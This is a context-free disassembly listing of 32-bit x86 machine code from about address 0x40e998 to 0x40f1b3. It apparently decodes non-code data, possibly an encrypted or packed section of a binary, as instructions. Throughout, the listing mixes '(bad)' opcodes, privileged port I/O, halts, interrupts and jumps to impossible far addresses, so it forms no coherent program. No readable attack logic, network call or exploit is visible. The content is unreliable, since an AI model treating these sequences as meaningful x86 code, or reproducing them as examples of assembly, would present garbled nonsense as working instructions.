  40e998:	mov    eax,0xd6f3c3a5
  40e99d:	(bad)
  40e9a0:	in     al,dx
  40e9a1:	mov    edi,0xf1bef9cc
  40e9a6:	repnz mov bh,0xf5
  40e9a9:	fdiv   st(4),st
  40e9ab:	add    ebx,ecx
  40e9ad:	lock test dl,0xea
  40e9b1:	stc    
  40e9b2:	fiadd  DWORD PTR [ebx]
  40e9b4:	or     DWORD PTR [edi],ecx
  40e9b6:	adc    esi,eax
  40e9b8:	out    0xad,al
  40e9ba:	int3   
  40e9bb:	in     eax,0xe0
  40e9bd:	in     eax,0xd0
  40e9bf:	hlt    
  40e9c0:	fcomi  st,st(7)
  40e9c2:	mov    eax,0xe3e8c9c4
  40e9c7:	(bad)  
  40e9c9:	shl    ch,cl
  40e9cb:	mov    ebp,0xdefbe1fe
  40e9d0:	mov    esi,0xf3fee5dd
  40e9d5:	cld    
  40e9d6:	retf   0xc9e0
  40e9d9:	lods   al,BYTE PTR ds:[esi]
  40e9da:	lods   al,BYTE PTR ds:[esi]
  40e9db:	mov    dh,0xf6
  40e9dd:	rol    ebp,1
  40e9df:	mov    edi,0xd5d8bbd1
  40e9e5:	fidivr WORD PTR [ecx-0x1e2b3318]
  40e9eb:	mul    ebx
  40e9ed:	pop    es
  40e9ee:	out    0xc5,eax
  40e9f0:	cli    
  40e9f1:	(bad)  
  40e9f2:	call   0xe22afd4
  40e9f7:	test   al,0xd3
  40e9f9:	mov    esi,0xd5f3cff5
  40e9fe:	stc    
  40e9ff:	(bad)  
  40ea00:	(bad)  
  40ea01:	mov    edx,0xd4fffff2
  40ea06:	cmc    
  40ea07:	add    ecx,edx
  40ea09:	loope  0x40e9e3
  40ea0b:	cmc    
  40ea0c:	rol    bh,1
  40ea0e:	fadd   QWORD PTR ds:0xeadddbe0
  40ea14:	clc    
  40ea15:	jmp    0xf300d705
  40ea1a:	ret    
  40ea1b:	shr    DWORD PTR [edx-0x3a351b1c],0xf0
  40ea22:	lods   al,BYTE PTR ds:[esi]
  40ea23:	aad    0xc9
  40ea25:	enter  0xc8d5,0xf9
  40ea29:	mov    edi,0xc4d3bdc7
  40ea2e:	cmc    
  40ea2f:	leave  
  40ea30:	retf   0xf9fe
  40ea33:	lds    eax,FWORD PTR [esi]
  40ea35:	add    DWORD PTR [ecx],edx
  40ea37:	in     eax,dx
  40ea38:	jmp    0xeaee:0xced2e7d7
  40ea3f:	mov    edx,0xfae4eed3
  40ea44:	mov    dl,0xbe
  40ea46:	out    dx,eax
  40ea47:	in     al,dx
  40ea48:	aad    0xef
  40ea4a:	ret    0x5f7
  40ea4d:	mov    ecx,0xd601f5d1
  40ea52:	shl    ch,0xfe
  40ea55:	repnz icebp 
  40ea57:	in     al,dx
  40ea58:	mov    esp,0xbcf5c3cf
  40ea5d:	out    dx,eax
  40ea5e:	int3   
  40ea5f:	out    0xee,al
  40ea61:	out    0xbf,eax
  40ea63:	cmc    
  40ea64:	sar    DWORD PTR [ebx-0x8310929],cl
  40ea6a:	aad    0xd7
  40ea6c:	cmc    
  40ea6d:	out    0x2,al
  40ea6f:	or     edi,ecx
  40ea71:	push   cs
  40ea72:	neg    dh
  40ea74:	sti    
  40ea75:	or     esp,ebx
  40ea77:	jmp    0xe5f4bc41
  40ea7c:	jmp    0xd7f7:0xeeb1b7cf
  40ea83:	fucomi st,st(2)
  40ea85:	test   ebp,0xe7b5e3f4
  40ea8b:	loopne 0x40ea68
  40ea8d:	push   es
  40ea8e:	mov    dh,0x3
  40ea91:	(bad)  
  40ea92:	retf   0xe6c9
  40ea95:	clc    
  40ea96:	fsub   st(7),st
  40ea98:	loope  0x40ea84
  40ea9a:	leave  
  40ea9b:	int3   
  40ea9c:	loope  0x40ea60
  40ea9e:	in     eax,0xf0
  40eaa0:	(bad)
  40eaa3:	repz aad 0xbf
  40eaa6:	jmp    0xe6fddea3
  40eaab:	fistp  QWORD PTR [ebp+esi*8+0x6f4fde7]
  40eab2:	fadd   QWORD PTR [ebx]
  40eab4:	fisttp DWORD PTR [ecx]
  40eab6:	or     ah,BYTE PTR [edi-0x372c410e]
  40eabc:	fucomi st,st(7)
  40eabe:	loopne 0x40ea88
  40eac0:	aam    0xb9
  40eac2:	icebp  
  40eac3:	mov    edx,0xeef7fcdf
  40eac8:	shl    edx,0xfc
  40eacb:	mov    esp,0xe1f20bdf
  40ead0:	retf   
  40ead1:	(bad)  
  40ead2:	loopne 0x40ea98
  40ead4:	call   0xd80adce4
  40ead9:	int    0xeb
  40eadb:	hlt    
  40eadc:	into   
  40eadd:	mov    ah,0xf7
  40eadf:	in     al,0xef
  40eae1:	iret   
  40eae2:	not    ebx
  40eae4:	fdivp  st(6),st
  40eae6:	stc    
  40eae7:	cmc    
  40eae8:	aam    0xfe
  40eaea:	shl    ah,0xc0
  40eaed:	inc    dh
  40eaef:	or     DWORD PTR [eax],eax
  40eaf1:	add    BYTE PTR [esp+eiz*8],al
  40eaf4:	out    0xd3,al
  40eaf6:	(bad)  
  40eaf8:	repnz fisubr WORD PTR [esi-0x6190a29]
  40eaff:	retf   
  40eb00:	cli    
  40eb01:	mov    ebx,0xd7f9d2e5
  40eb06:	rcr    bl,cl
  40eb08:	shl    dl,cl
  40eb0a:	in     eax,dx
  40eb0b:	aad    0xd0
  40eb0d:	ret    0xdbe9
  40eb10:	rcr    dh,0xf9
  40eb13:	into   
  40eb14:	fnclex 
  40eb16:	out    dx,eax
  40eb17:	scas   eax,DWORD PTR es:[edi]
  40eb18:	shl    esi,0xb3
  40eb1b:	mov    esp,0xebbbadf0
  40eb20:	(bad)  
  40eb21:	not    ch
  40eb23:	out    dx,al
  40eb24:	fcomip st,st(3)
  40eb26:	cld    
  40eb27:	sar    BYTE PTR [ebp-0xf0bf939],cl
  40eb2d:	(bad)  
  40eb2e:	loopne 0x40eb0a
  40eb30:	loop   0x40eb13
  40eb32:	dec    eax
  40eb34:	adc    esp,ebp
  40eb36:	jmp    0xdbaf:0xceb2a9f0
  40eb3d:	retf   
  40eb3e:	loope  0x40eb1a
  40eb40:	clc    
  40eb41:	rcr    ecx,1
  40eb43:	repz mov ah,0xf9
  40eb46:	aad    0xfd
  40eb48:	lock add bl,dh
  40eb4b:	add    eax,0xd6f003c3
  40eb50:	(bad)  
  40eb51:	retf   
  40eb52:	or     eax,edi
  40eb54:	add    eax,0xdeb8ce09
  40eb59:	mov    edi,0xb5b6abd7
  40eb5e:	not    dl
  40eb60:	in     eax,0xc7
  40eb62:	in     al,0xea
  40eb64:	hlt    
  40eb65:	call   0xe30eb546
  40eb6a:	ror    ebp,cl
  40eb6c:	xlat   BYTE PTR ds:[ebx]
  40eb6d:	cmc    
  40eb6e:	add    esp,eax
  40eb70:	(bad)  
  40eb71:	aad    0x9
  40eb73:	aad    0x9
  40eb75:	call   edx
  40eb77:	lods   eax,DWORD PTR ds:[esi]
  40eb78:	mov    cl,0xcb
  40eb7a:	rol    eax,0xbc
  40eb7d:	ret    0xc7c1
  40eb80:	mov    dh,0xb5
  40eb82:	out    dx,al
  40eb83:	mov    ch,0xd6
  40eb85:	(bad)  
  40eb87:	call   0xf11bf38b
  40eb8c:	ffreep st(7)
  40eb8e:	cli    
  40eb8f:	fisttp WORD PTR [edi]
  40eb91:	clc    
  40eb92:	add    DWORD PTR [edx],ecx
  40eb94:	jmp    0xd0cb:0xd1e9da0d
  40eb9b:	div    DWORD PTR [ebx-0x37143120]
  40eba1:	in     al,dx
  40eba2:	jmp    0xbddd:0xcad4dcd7
  40eba9:	mov    ebp,0xc1d6df06
  40ebae:	(bad)  
  40ebaf:	push   es
  40ebb0:	add    al,0x6
  40ebb2:	fdiv   st(1),st
  40ebb4:	adc    eax,DWORD PTR [esp+eiz*8]
  40ebb7:	shl    al,1
  40ebb9:	lods   eax,DWORD PTR ds:[esi]
  40ebba:	jmp    0xd121bea0
  40ebbf:	les    edi,FWORD PTR [eax-0x12012d4b]
  40ebc5:	(bad)  
  40ebc6:	(bad)  
  40ebc7:	mov    esi,0xd6fb06f8
  40ebcc:	mov    ebp,0x20300c7
  40ebd1:	add    bl,bl
  40ebd3:	aam    0xd
  40ebd5:	fsubp  st(3),st
  40ebd7:	(bad)  
  40ebd8:	mov    esi,0xb3eaaef6
  40ebdd:	mov    ebx,0xb0d2f7ea
  40ebe2:	(bad)  
  40ebe4:	sti    
  40ebe5:	sar    DWORD PTR [edi-0x2f1f3f2e],cl
  40ebeb:	mov    esi,0xc7c5fbd4
  40ebf0:	mov    DWORD PTR [edx],0xbffdf0a
  40ebf6:	stc    
  40ebf7:	mov    dl,0xe9
  40ebf9:	out    dx,al
  40ebfa:	leave  
  40ebfb:	retf   0xcafb
  40ebfe:	mov    cl,0xdb
  40ec00:	(bad)  
  40ec02:	mov    edi,0xd0c3d7fc
  40ec07:	icebp  
  40ec08:	out    dx,al
  40ec09:	add    edi,DWORD PTR [ebp-0xb3afe09]
  40ec0f:	lds    eax,FWORD PTR [esi]
  40ec11:	xlat   BYTE PTR ds:[ebx]
  40ec12:	rol    BYTE PTR [ebx],0x9
  40ec15:	int    0xca
  40ec17:	stos   DWORD PTR es:[edi],eax
  40ec18:	test   eax,0xb1accddf
  40ec1d:	loope  0x40ebd9
  40ec1f:	in     al,0xef
  40ec21:	cmc    
  40ec22:	shr    edi,1
  40ec24:	leave  
  40ec25:	cld    
  40ec26:	sar    dh,cl
  40ec28:	mov    esi,0xd7d8d7fe
  40ec2d:	aam    0xff
  40ec2f:	in     eax,0xc8
  40ec31:	pop    es
  40ec32:	hlt    
  40ec33:	cli    
  40ec34:	add    al,0xd9
  40ec36:	fsubrp st(0),st
  40ec38:	xlat   BYTE PTR ds:[ebx]
  40ec39:	rol    bh,cl
  40ec3b:	mov    cl,0xb5
  40ec3d:	(bad)
  40ec41:	mov    edi,0xfff2edf3
  40ec46:	icebp  
  40ec47:	fcmovnu st,st(1)
  40ec49:	mov    esi,0x4c7e1cc
  40ec4e:	icebp  
  40ec4f:	in     al,0xdc
  40ec51:	femms  
  40ec53:	les    ecx,FWORD PTR [ebx]
  40ec55:	leave  
  40ec56:	out    dx,al
  40ec57:	in     al,0xf3
  40ec59:	lods   eax,DWORD PTR ds:[esi]
  40ec5a:	out    0xf1,al
  40ec5c:	jecxz  0x40ec21
  40ec5e:	div    DWORD PTR [edx-0x2f110b05]
  40ec64:	repnz (bad) 
  40ec67:	hlt    
  40ec68:	ret    
  40ec69:	pop    es
  40ec6a:	ret    
  40ec6b:	lock stc 
  40ec6d:	cli    
  40ec6e:	ret    
  40ec6f:	(bad)  
  40ec71:	out    0x5,al
  40ec73:	iret   
  40ec74:	clc    
  40ec75:	push   es
  40ec76:	icebp  
  40ec77:	lds    esp,FWORD PTR [esi-0x1e0f2353]
  40ec7d:	mov    bh,0xba
  40ec7f:	clc    
  40ec80:	fldlg2 
  40ec82:	fxch   st(4)
  40ec84:	int3   
  40ec85:	ret    
  40ec86:	leave  
  40ec87:	mov    esi,0x1f8d6cc
  40ec8c:	mov    esi,0xebdbd8da
  40ec91:	or     al,BYTE PTR [esi]
  40ec93:	(bad)  
  40ec94:	(bad)  
  40ec96:	add    al,0xa7
  40ec98:	shl    edx,cl
  40ec9a:	out    0xca,eax
  40ec9c:	int3   
  40ec9d:	icebp  
  40ec9e:	imul   ebp
  40eca0:	out    0xb1,al
  40eca2:	hlt    
  40eca3:	retf   
  40eca4:	(bad)  
  40eca5:	(bad)  
  40eca7:	hlt    
  40eca8:	mov    esp,0xc3edfc
  40ecad:	(bad)  
  40ecae:	or     dl,bh
  40ecb0:	add    bh,bh
  40ecb2:	enter  0x9dd,0xf2
  40ecb6:	in     eax,dx
  40ecb7:	repz jmp 0xb6ac:0xc3f1e7e2
  40ecbf:	in     al,dx
  40ecc0:	jmp    0x38a4ae
  40ecc5:	mov    eax,0xbfd8fcdc
  40ecca:	fild   WORD PTR [esi]
  40eccc:	out    0xdc,eax
  40ecce:	(bad)  
  40eccf:	(bad)  
  40ecd0:	fdivr  st(4),st
  40ecd2:	(bad)
  40ecd5:	clc    
  40ecd6:	or     BYTE PTR [eax-0x432d2c37],bh
  40ecdc:	div    edx
  40ecde:	cli    
  40ecdf:	(bad)  
  40ece0:	hlt    
  40ece1:	jmp    0xd132b1c4
  40ece6:	out    dx,al
  40ece7:	add    dl,bl
  40ece9:	icebp  
  40ecea:	ret    
  40eceb:	cli    
  40ecec:	out    0xe0,al
  40ecee:	div    ch
  40ecf0:	jmp    0xc807:0xd400d4c7
  40ecf7:	(bad)  
  40ecf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecf9:	test   al,0xa8
  40ecfb:	loop   0x40ecde
  40ecfd:	(bad)  
  40ecfe:	loope  0x40eceb
  40ed00:	mov    dh,0xec
  40ed02:	idiv   edi
  40ed04:	mov    esp,0xd6fdeed4
  40ed09:	repnz aam 0xfc
  40ed0c:	mov    ebp,0xdbfe0205
  40ed11:	add    al,bh
  40ed13:	out    dx,eax
  40ed14:	or     ah,bh
  40ed16:	in     eax,dx
  40ed17:	rcl    eax,cl
  40ed19:	out    dx,al
  40ed1a:	shl    eax,0xb1
  40ed1d:	repnz icebp 
  40ed1f:	enter  0xd5f2,0xf1
  40ed23:	(bad)  
  40ed24:	rcl    eax,1
  40ed26:	(bad)  
  40ed28:	(bad)  
  40ed29:	mov    ebp,0xdcf60100
  40ed2e:	lock ret 0xc1c8
  40ed32:	into   
  40ed33:	jmp    0xb413e012
  40ed38:	(bad)  
  40ed39:	repnz (bad) 
  40ed3c:	lock iret 
  40ed3e:	mov    ebx,0xeaebf9e9
  40ed43:	in     eax,0xd4
  40ed45:	int3   
  40ed46:	xlat   BYTE PTR ds:[ebx]
  40ed47:	mov    ebx,0xfbd4ce01
  40ed4c:	xlat   BYTE PTR ds:[ebx]
  40ed4d:	jecxz  0x40ed4b
  40ed4f:	fcmove st,st(0)
  40ed51:	clc    
  40ed52:	add    eax,0xadadec6
  40ed57:	enter  0xb7d8,0xae
  40ed5b:	jecxz  0x40ed26
  40ed5d:	loopne 0x40ed15
  40ed5f:	in     eax,dx
  40ed60:	clc    
  40ed61:	out    dx,al
  40ed62:	retf   
  40ed63:	fmulp  st(2),st
  40ed65:	(bad)  
  40ed66:	aam    0xe2
  40ed68:	jecxz  0x40ed6c
  40ed6a:	rcr    esp,cl
  40ed6c:	rcl    ebx,1
  40ed6e:	fimul  DWORD PTR [eax]
  40ed70:	(bad)  
  40ed72:	clc    
  40ed73:	out    0x7,al
  40ed75:	enter  0xd8fc,0xd0
  40ed79:	lds    edi,FWORD PTR [esp+ebp*4-0x160c383a]
  40ed80:	mov    ch,0xe7
  40ed82:	into   
  40ed83:	sar    ebx,cl
  40ed85:	mov    edx,0xccfed4cf
  40ed8a:	in     eax,0xbf
  40ed8c:	ret    
  40ed8d:	fsubrp st(6),st
  40ed8f:	aad    0xc1
  40ed91:	(bad)  
  40ed92:	fld    DWORD PTR [edi+edi*8]
  40ed95:	repnz (bad)
  40ed98:	out    0xe7,al
  40ed9a:	mov    esp,0xeaf6c6b3
  40ed9f:	icebp  
  40eda0:	in     eax,dx
  40eda1:	(bad)  
  40eda3:	int    0xdb
  40eda5:	fdivr  st(6),st
  40eda7:	mov    esp,0xc105fcd1
  40edac:	or     edi,edx
  40edae:	fild   DWORD PTR [edx]
  40edb0:	hlt    
  40edb1:	add    al,0xf
  40edb3:	(bad)  
  40edb5:	int    0x12
  40edb7:	int3   
  40edb8:	ret    0xb0e0
  40edbb:	aam    0xb0
  40edbd:	(bad)  
  40edbe:	mov    dl,0xcf
  40edc0:	clc    
  40edc1:	retf   
  40edc2:	out    dx,al
  40edc3:	in     eax,dx
  40edc4:	mov    ebp,0xdadac8b5
  40edc9:	cld    
  40edca:	mov    esp,0xc5c60601
  40edcf:	or     dh,dl
  40edd1:	(bad)  
  40edd3:	(bad)  
  40edd5:	add    al,0xfc
  40edd7:	ret    
  40edd8:	out    0xc2,eax
  40edda:	call   0xef0bceaa
  40eddf:	mov    ebx,0xbbb0d6fa
  40ede4:	clc    
  40ede5:	fnstcw WORD PTR [ebp-0x41252610]
  40edeb:	in     eax,0xe6
  40eded:	xlat   BYTE PTR ds:[ebx]
  40edee:	(bad)  
  40edef:	(bad)  
  40edf1:	hlt    
  40edf2:	out    dx,al
  40edf3:	clc    
  40edf4:	add    DWORD PTR [esi+ebp*8],ecx
  40edf7:	into   
  40edf8:	mov    bl,0xe7
  40edfa:	test   al,0xab
  40edfc:	fmul   st(7),st
  40edfe:	shr    al,1
  40ee00:	int    0xcc
  40ee02:	out    dx,al
  40ee03:	mov    ebx,0xc2e2e8bd
  40ee08:	icebp  
  40ee09:	fld    st(0)
  40ee0b:	(bad)
  40ee0e:	out    0xfc,eax
  40ee10:	(bad)  
  40ee12:	or     eax,0xdacde2fd
  40ee17:	ret    
  40ee18:	(bad)  
  40ee19:	loopne 0x40edca
  40ee1b:	rcr    ah,1
  40ee1d:	test   eax,0xd2e8ead9
  40ee22:	ror    esp,1
  40ee24:	mov    edx,0xdebe03da
  40ee29:	int3   
  40ee2a:	loop   0x40ee2f
  40ee2c:	mov    al,0x6
  40ee2f:	out    0xf5,al
  40ee31:	(bad)  [edx]
  40ee33:	add    ebx,esi
  40ee35:	add    cl,ah
  40ee37:	out    dx,eax
  40ee38:	int    0xc3
  40ee3a:	ret    0xd0e7
  40ee3d:	test   esp,0xf3c4d7e9
  40ee43:	leave  
  40ee44:	(bad)  
  40ee45:	loop   0x40ee21
  40ee47:	add    bh,dh
  40ee49:	mov    esp,0xf4ffc6f5
  40ee4e:	cld    
  40ee4f:	pop    es
  40ee50:	jecxz  0x40ee3d
  40ee52:	aam    0xc4
  40ee54:	retf   0x9e8
  40ee57:	mov    esi,0xc6ecc7ed
  40ee5c:	shl    DWORD PTR [edi-0xe045037],cl
  40ee62:	cmc    
  40ee63:	jmp    0x40ee60
  40ee65:	loop   0x40ee58
  40ee67:	(bad)  
  40ee69:	rcr    bl,1
  40ee6b:	sti    
  40ee6c:	rol    DWORD PTR [ecx],1
  40ee6e:	ffreep st(5)
  40ee70:	fild   WORD PTR [ebx]
  40ee72:	cld    
  40ee73:	add    BYTE PTR [eax],cl
  40ee75:	(bad)  [esi]
  40ee77:	repz shr bh,0xe3
  40ee7b:	jmp    0x40ee4b
  40ee7d:	out    dx,eax
  40ee7e:	out    dx,al
  40ee7f:	in     eax,0xe4
  40ee81:	jmp    0xdcf3bb7d
  40ee86:	out    dx,al
  40ee87:	enter  0xfabc,0x5
  40ee8b:	fcomp  st(6)
  40ee8d:	hlt    
  40ee8e:	hlt    
  40ee8f:	in     al,0xf7
  40ee91:	enter  0xe5cb,0xdd
  40ee95:	retf   0xe7dc
  40ee98:	(bad)  
  40ee99:	ror    esp,1
  40ee9b:	int3   
  40ee9c:	enter  0xe5ea,0xb6
  40eea0:	out    dx,eax
  40eea1:	jmp    0xbafe:0xd0ecb9df
  40eea8:	std    
  40eea9:	add    esp,ebx
  40eeab:	mov    ebx,0xd109c5f5
  40eeb0:	add    dh,ah
  40eeb2:	mov    esp,0xfddbdcde
  40eeb7:	scas   eax,DWORD PTR es:[edi]
  40eeb8:	fcom   st(1)
  40eeba:	retf   
  40eebb:	out    0xe6,eax
  40eebd:	(bad)  
  40eebe:	loopne 0x40ee99
  40eec0:	rol    edi,1
  40eec2:	mov    edx,0xbadaf9d9
  40eec7:	icebp  
  40eec8:	loope  0x40ee8d
  40eeca:	sar    bl,cl
  40eecc:	mov    esp,0xf6f1c1f7
  40eed1:	stc    
  40eed2:	in     eax,0xde
  40eed4:	fmulp  st(6),st
  40eed6:	add    al,0xe0
  40eed8:	test   al,0xaf
  40eeda:	div    BYTE PTR [ebx-0x45141d40]
  40eee0:	in     al,0xe9
  40eee2:	mov    ebx,0xf1f6efcd
  40eee7:	sar    DWORD PTR [edi-0x3c1d3f07],0xd2
  40eeee:	out    0xfe,al
  40eef0:	add    BYTE PTR [eax],al
  40eef2:	fsub   st(7),st
  40eef4:	clc    
  40eef5:	fdivp  st(0),st
  40eef7:	shl    eax,0xc6
  40eefa:	ret    0xbcb6
  40eefd:	mov    al,0xd4
  40eeff:	retf   
  40ef00:	mov    ebx,0xd1e4c4d9
  40ef05:	aad    0x3
  40ef07:	cmc    
  40ef08:	mov    eax,0xbdffbe1
  40ef0d:	sti    
  40ef0e:	mov    eax,0x4d5fbe1
  40ef13:	int    0xde
  40ef15:	cli    
  40ef16:	pop    es
  40ef17:	repnz retf 
  40ef19:	out    0xae,eax
  40ef1b:	leave  
  40ef1c:	jecxz  0x40ef00
  40ef1e:	mov    ebx,0xd5eaf1bb
  40ef23:	mov    eax,0xd0f4cfd0
  40ef28:	fild   WORD PTR [esi]
  40ef2a:	add    ah,dl
  40ef2c:	ret    0xe7c1
  40ef2f:	div    dh
  40ef31:	push   es
  40ef32:	retf   
  40ef33:	jmp    0x40ef3d
  40ef35:	iret   
  40ef36:	clc    
  40ef37:	enter  0xbcdc,0xe1
  40ef3b:	lods   al,BYTE PTR ds:[esi]
  40ef3c:	int3   
  40ef3d:	mul    dh
  40ef3f:	bnd call 0xd6feaa24
  40ef45:	std    
  40ef46:	cld    
  40ef47:	mov    esp,0xe7dabedc
  40ef4c:	ret    0xafc
  40ef4f:	out    0xda,eax
  40ef51:	out    0xff,al
  40ef53:	iret   
  40ef54:	cld    
  40ef55:	fnclex 
  40ef57:	shr    DWORD PTR [ecx-0x14341f21],cl
  40ef5d:	div    ah
  40ef5f:	aad    0xe5
  40ef61:	lds    edi,FWORD PTR [edi-0x82b4a32]
  40ef67:	cld    
  40ef68:	rcl    esi,cl
  40ef6a:	in     eax,0xf3
  40ef6c:	in     al,dx
  40ef6d:	loop   0x40ef27
  40ef6f:	shr    edx,1
  40ef71:	fmul   DWORD PTR [ecx]
  40ef73:	retf   
  40ef74:	leave  
  40ef75:	sti    
  40ef76:	icebp  
  40ef77:	mov    bl,0xc6
  40ef79:	lods   eax,DWORD PTR ds:[esi]
  40ef7a:	out    0xd4,eax
  40ef7c:	retf   0xd1b2
  40ef7f:	mov    dl,0xea
  40ef81:	mov    edx,0xd2dafaf3
  40ef86:	lock repnz cmc 
  40ef89:	repz cmc 
  40ef8b:	in     eax,dx
  40ef8c:	mov    esi,0xe4fef2e6
  40ef91:	cmc    
  40ef92:	mov    esp,0xee00cfd4
  40ef97:	mov    bl,0xbd
  40ef99:	in     eax,dx
  40ef9a:	mov    esp,0xb2ede6cb
  40ef9f:	(bad)  
  40efa0:	mov    bh,0xe7
  40efa2:	mov    al,0xf1
  40efa4:	mov    dl,0xb9
  40efa6:	clc    
  40efa7:	repz mov esp,0xc3fdfac0
  40efad:	repz aam 0xf4
  40efb0:	(bad)  
  40efb2:	jmp    0xdd4dd099
  40efb7:	loop   0x40ef9b
  40efb9:	loope  0x40ef9c
  40efbb:	ret    
  40efbc:	leave  
  40efbd:	jmp    0xd7f2:0xdbc8c6db
  40efc4:	mov    ch,0xb4
  40efc6:	jecxz  0x40ef87
  40efc8:	repz loopne 0x40efc8
  40efcb:	aad    0x5
  40efcd:	rcr    al,0xde
  40efd0:	loope  0x40efce
  40efd2:	(bad)  
  40efd4:	add    al,0xcd
  40efd6:	(bad)  
  40efd8:	fucomip st,st(7)
  40efda:	in     al,0xe4
  40efdc:	mov    bl,0xe6
  40efde:	jmp    0xec33b5da
  40efe3:	leave  
  40efe4:	aam    0xdb
  40efe6:	(bad)  
  40efe7:	clc    
  40efe8:	lock mov eax,0xead3e2ec
  40efee:	retf   
  40efef:	shr    ecx,1
  40eff1:	(bad)  
  40eff2:	aad    0xfe
  40eff4:	fiadd  DWORD PTR [edi]
  40eff6:	loopne 0x40efde
  40eff8:	(bad)  
  40effa:	out    0xb1,al
  40effc:	loopne 0x40efde
  40effe:	loope  0x40efbb
  40f000:	jmp    0x40efed
  40f002:	mov    eax,0xc8e9efd4
  40f007:	hlt    
  40f008:	rol    dl,0xcd
  40f00b:	vpsrlw ymm3,ymm1,xmm7
  40f00f:	jmp    0xfa01:0xe7e9d5d5
  40f016:	in     eax,dx
  40f017:	rcr    bh,cl
  40f019:	icebp  
  40f01a:	aad    0xd6
  40f01c:	leave  
  40f01d:	(bad)
  40f020:	mov    ah,0xe4
  40f022:	out    0xb7,al
  40f024:	clc    
  40f025:	cld    
  40f026:	jecxz  0x40efe6
  40f028:	in     al,dx
  40f029:	iret   
  40f02a:	add    eax,0x604ded6
  40f02f:	push   es
  40f030:	jmp    0xf2e6:0xeafacad5
  40f037:	out    0xcd,eax
  40f039:	vaddsubps xmm5,xmm2,xmm0
  40f03d:	shl    BYTE PTR [ebx-0xc253826],cl
  40f043:	call   esi
  40f045:	retf   0xcc02
  40f048:	add    ebx,esp
  40f04a:	sar    dl,0xfa
  40f04d:	loopne 0x40f013
  40f04f:	fxch   st(2)
  40f051:	stc    
  40f052:	add    al,cl
  40f054:	push   es
  40f055:	jecxz  0x40f021
  40f057:	lds    esi,FWORD PTR [edx-0x314d3315]
  40f05d:	in     eax,0xdb
  40f05f:	(bad)  
  40f060:	mov    cl,0xcf
  40f062:	shl    ch,cl
  40f064:	mov    edx,0xf5d003db
  40f069:	out    0xd9,eax
  40f06b:	fadd   st,st(7)
  40f06d:	icebp  
  40f06e:	loope  0x40f04f
  40f070:	std    
  40f071:	aad    0xd9
  40f073:	fisttp WORD PTR [ebx]
  40f075:	cli    
  40f076:	push   es
  40f077:	test   al,0xb0
  40f079:	fidivr WORD PTR [ebp-0x39182f3e]
  40f07f:	aad    0xb0
  40f081:	int3   
  40f082:	idiv   DWORD PTR [edx-0x33062210]
  40f088:	ret    
  40f089:	shl    dl,0xfc
  40f08c:	fnstsw WORD PTR [ecx-0x941fb36]
  40f092:	into   
  40f093:	pop    es
  40f094:	push   es
  40f095:	in     al,0xe1
  40f097:	shr    esi,1
  40f099:	int    0xae
  40f09b:	out    dx,eax
  40f09c:	mov    esp,0xf2b0c6db
  40f0a1:	lock mov edi,0xb0ccfef1
  40f0a7:	(bad)  
  40f0a8:	loop   0x40f076
  40f0aa:	(bad)  
  40f0ac:	(bad)  
  40f0ad:	cli    
  40f0ae:	ret    
  40f0af:	(bad)  
  40f0b1:	(bad)  
  40f0b2:	jmp    0x40f0b4
  40f0b4:	loop   0x40f08e
  40f0b6:	jmp    0xcc0daeac
  40f0bb:	int3   
  40f0bc:	hlt    
  40f0bd:	call   0xc611bc87
  40f0c2:	aad    0xdc
  40f0c4:	fild   WORD PTR [ebx]
  40f0c6:	mov    esi,0xc6e1e2dd
  40f0cb:	out    0xff,al
  40f0cd:	clc    
  40f0ce:	add    bh,ah
  40f0d0:	hlt    
  40f0d1:	loope  0x40f0c7
  40f0d3:	loope  0x40f0ae
  40f0d5:	repnz iret 
  40f0d7:	mov    edi,0xefb2c3cc
  40f0dc:	lock iret 
  40f0de:	test   al,0xaf
  40f0e0:	repz (bad) 
  40f0e3:	idiv   DWORD PTR [edx-0x423432f]
  40f0e9:	add    esp,ecx
  40f0eb:	fcmovnu st,st(3)
  40f0ed:	mov    ebp,0xded5f4c5
  40f0f2:	add    ecx,DWORD PTR [ecx]
  40f0f4:	call   DWORD PTR [edx]
  40f0f6:	pmaxub mm1,mm1
  40f0f9:	(bad)  
  40f0fa:	mov    bl,0xf2
  40f0fc:	repnz repnz rol dh,cl
  40f100:	rcl    bh,cl
  40f102:	mov    ecx,0xccfbccd9
  40f107:	sti    
  40f108:	mov    eax,0xfde0d2f8
  40f10d:	rcr    edx,0xc9
  40f110:	add    eax,0xca0cd5e9
  40f115:	(bad)  
  40f116:	call   0xca06d902
  40f11b:	lods   eax,DWORD PTR ds:[esi]
  40f11c:	repnz rcr edx,1
  40f11f:	scas   eax,DWORD PTR es:[edi]
  40f120:	enter  0xbabf,0xcf
  40f124:	fdiv   st(6),st
  40f126:	imul   ah
  40f128:	mov    ebp,0xf6f9ccf7
  40f12d:	jmp    0x40f120
  40f12f:	(bad)  
  40f130:	clc    
  40f131:	loop   0x40f120
  40f133:	retf   0xe2ff
  40f136:	loop   0x40f109
  40f138:	mov    al,0xcd
  40f13a:	in     eax,dx
  40f13b:	loope  0x40f121
  40f13d:	jmp    0xd0db:0xeaf8f3da
  40f144:	add    esi,DWORD PTR [ecx+eax*1-0x2e380013]
  40f14b:	loope  0x40f114
  40f14d:	add    al,0xf0
  40f14f:	clc    
  40f150:	fdivr  st,st(0)
  40f152:	fucomi st,st(7)
  40f154:	in     al,dx
  40f155:	fucom  st(4)
  40f157:	loopne 0x40f138
  40f159:	jmp    0xc201de4b
  40f15e:	mov    edx,0xf2eef0c6
  40f163:	mov    ecx,0xc8d7ebe9
  40f168:	mov    esi,0xd2e5bdee
  40f16d:	cmc    
  40f16e:	clc    
  40f16f:	sti    
  40f170:	ret    0xbdb
  40f173:	add    ecx,DWORD PTR [eax]
  40f175:	fimul  WORD PTR ds:0xe4ecbed0
  40f17b:	in     eax,0xc5
  40f17d:	icebp  
  40f17e:	cli    
  40f17f:	retf   
  40f180:	(bad)  
  40f181:	rol    ch,1
  40f183:	iret   
  40f184:	mov    eax,0xcfdce2cd
  40f189:	into   
  40f18a:	add    eax,0x3050bfd
  40f18f:	loop   0x40f15c
  40f191:	sti    
  40f192:	retf   0xdec7
  40f195:	jmp    0x40f182
  40f197:	into   
  40f198:	icebp  
  40f199:	loope  0x40f169
  40f19b:	fdivr  st(5),st
  40f19d:	(bad)
  40f1a0:	icebp  
  40f1a1:	mov    ecx,0xf7e8bed0
  40f1a6:	(bad)  
  40f1a8:	jecxz  0x40f16b
  40f1aa:	add    esi,eax
  40f1ac:	(bad)  
  40f1ad:	fcom   st(5)
  40f1af:	hlt    
  40f1b0:	sldt   edi
  40f1b3:	add    eax,0xb2ddef02
